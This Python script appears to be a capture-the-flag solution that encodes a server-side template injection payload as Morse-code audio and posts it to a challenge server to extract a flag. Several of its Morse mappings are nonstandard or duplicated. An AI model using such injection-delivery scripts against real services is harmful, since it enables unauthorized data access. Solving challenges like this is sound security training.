import io
import math
import struct
import wave
import requests

MORSE = {
    "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.", "G": "--.",
    "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..", "M": "--", "N": "-.",
    "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.", "S": "...", "T": "-", "U": "..-",
    "V": "...-", "W": ".--", "X": "-..-", "Y": "-.--", "Z": "--..",
    "0": "-----", "1": ".----", "2": "..---", "3": "...--", "4": "....-", "5": ".....",
    "6": "-....", "7": "--...", "8": "---..", "9": "----.",
    ".": ".-.-.-", ",": "--..--", "?": "..--..", "'": ".----.", "!": "-.-.--",
    "/": "-..-.", "(": "-.--.", ")": "-.--.-", "&": ".-...", ":": "---...",
    ";": "-.-.-.", "=": "-...-", "+": ".-.-.", "-": "-....-", "_": "..--.-",
    '"': ".-..-.", "$": "...-..-", "@": ".--.-.", "*": ".-.-.",
    "{": "--.--", "}": "--..-", "[": ".-.-.", "]": "-.-.."
}

def generate_tone(duration_sec, sample_rate=8000, freq=750, amp=16000):
    n_samples = int(duration_sec * sample_rate)
    return [int(amp * math.sin(2 * math.pi * freq * i / sample_rate)) for i in range(n_samples)]

def generate_silence(duration_sec, sample_rate=8000):
    return [0] * int(duration_sec * sample_rate)

def text_to_wav(text, filename="payload.wav"):
    unit = 0.065
    rate = 8000
    samples = []

    samples.extend(generate_silence(0.1, rate))

    words = text.split(" ")
    for w_idx, word in enumerate(words):
        for c_idx, char in enumerate(word.upper()):
            code = MORSE.get(char)
            if not code:
                continue
            for s_idx, symbol in enumerate(code):
                duration = unit if symbol == "." else unit * 3
                samples.extend(generate_tone(duration, rate))
                if s_idx < len(code) - 1:
                    samples.extend(generate_silence(unit, rate))
            if c_idx < len(word) - 1:
                samples.extend(generate_silence(unit * 3, rate))
        if w_idx < len(words) - 1:
            samples.extend(generate_silence(unit * 7, rate))

    samples.extend(generate_silence(0.1, rate))

    with wave.open(filename, "wb") as w:
        w.setnchannels(1)
        w.setsampwidth(2)
        w.setframerate(rate)
        packed = struct.pack(f"<{len(samples)}h", *samples)
        w.writeframes(packed)
    print(f"[+] Successfully wrote {filename} (Duration: {len(samples)/rate:.2f}s)")
    return filename

if __name__ == "__main__":
    payload = '{{ vault["archive"]["transmissions"][0]["metadata"]["decoded"]["payload"] }}'
    print(f"[*] Generating WAV for SSTI payload: {payload}")
    wav_file = text_to_wav(payload, "exploit.wav")

    target = "https://byteme-morse-audio-ssti.onrender.com/signal"
    print(f"[*] Sending exploit to {target}...")
    try:
        with open(wav_file, "rb") as f:
            res = requests.post(target, files={"audio": (wav_file, f, "audio/wav")}, timeout=15)
        if "OWASP{" in res.text or "FLAG{" in res.text:
            print("[+] Exploit successful!")
            for line in res.text.splitlines():
                if "{" in line and "}" in line:
                    print(f"[+] Output line: {line.strip()}")
        else:
            print("[-] Flag not found in response. Response length:", len(res.text))
    except Exception as e:
        print(f"[-] Request failed (is server awake?): {e}")
